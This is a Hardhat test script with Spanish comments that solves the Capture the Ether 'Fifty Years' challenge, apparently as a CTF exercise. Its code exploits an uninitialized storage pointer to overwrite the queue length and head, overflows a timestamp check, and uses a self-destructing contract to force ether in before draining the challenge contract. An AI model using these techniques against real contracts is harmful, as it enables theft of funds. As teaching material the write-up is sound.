import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer, BigNumber } from "ethers";

//Un día equivale a (60 seg * 60 min * 24 hs)
const unDia: BigNumber = BigNumber.from(60).mul(60).mul(24);
const maxUint: BigNumber = BigNumber.from(2).pow(256);

const challengeAddress: string = "0xc9417b06a3CB5E1B2AeB38f1FB922F6e236C41cb";

let fiftyYearsContract: Contract;
let voltorbContract: Contract; //Recordás a Voltorb? Nos será de ayuda en este challenge.

beforeEach(async () => {
  const fiftyYearsFactory = await ethers.getContractFactory("FiftyYearsChallenge");
  fiftyYearsContract = fiftyYearsFactory.attach(challengeAddress);

  const voltorbFactory = await ethers.getContractFactory("Voltorb");
  voltorbContract = await voltorbFactory.deploy({ value: 2 }); //Creamos un Voltorb con el balance de 2 wei. Ya verás por qué ;)
  await voltorbContract.deployed();
})

describe("Fifty Years", async () => {
  it("Resuelve el Math challenge - Fifty Years", async () => {
    /*En la línea 35 y 36 del contrato podemos ver que la variable contribution no fue inicializada. Esto denota que podemos sobreescribir valores en el storage. En storage[0] se encuentra el length del array "queue". En el storage[1] se encuentra la variable head. Por transitividad tenemos lo siguiente:

    msg.value = contribution.amount = length queue ---> msg.value = length queue
    timestamp = contribution.unlockTimestamp = head ---> timestamp = head
    */

    //Ingresamos contribution con timestamp = maxUint - 1 dia. Con esto podremos bypassear el require de timestamp >= último timestamp + 1 dia.
    //El msg.value = 1 wei debido a la lógica del "push". Primero agranda el length en 1 y luego agrega la contribución a la cola. Así, el mismo valor de length que estamos sobreescribiendo, se ve modificado por esta lógica. Ingresando msg.value=1 wei lo que se hace es mantener el array con un length de 2 (contrib inicial + contrib que metemos ahora)
    let txPrimerUpsert = await fiftyYearsContract.upsert(1, BigNumber.from(maxUint).sub(unDia), { value: 1 })
    await txPrimerUpsert.wait();

    //Ingresando el timestamp de 0, bypasseamos el require del timestamp gracias a la contribución ingresada anteriormente y dejamos el timestamp de esta última en 0. Así podremos invocar withdraw ya que "now" >= 0 y la variable head vuelve a ser 0.
    let txSegundoUpsert = await fiftyYearsContract.upsert(2, 0, { value: 2 });
    await txSegundoUpsert.wait();

    /*Ahora debemos solucionar un pequeño inconveniente. El balance del contrato debería ser de 1 ether y 3 wei, pero totalizando el monto de las contribuciones en queue, las mismas dan un total de 1 ether y 5 wei. ¿Por qué sucedió esto? Si recordamos, el push dentro de upsert opera primero aumentando el length, y luego ingresando la contribución. Al aumentar el length, se aumenta también el amount, ya que ambos refieren al slot[0] como comentamos anteriormente.
    Ahora bien, al invocar withdraw(2) (índice 2 debido a que en esa posición se encuentra nuestro timestamp=0), el contrato querrá transferirnos 1 ether y 5 wei, pero solo tiene 1 ether y 3 wei, por lo que ocurrirá un error. ¿Solución? ¡Voltorb yo te elijo!
    */

    await voltorbContract.explosion(challengeAddress);

    //Ahora con el balance correcto, invocamos a withdraw

    let txWithdraw = await fiftyYearsContract.withdraw(2);
    await txWithdraw.wait();

    //Chequeo si el balance del contrato es cero
    let isComplete = await fiftyYearsContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true;
  })
})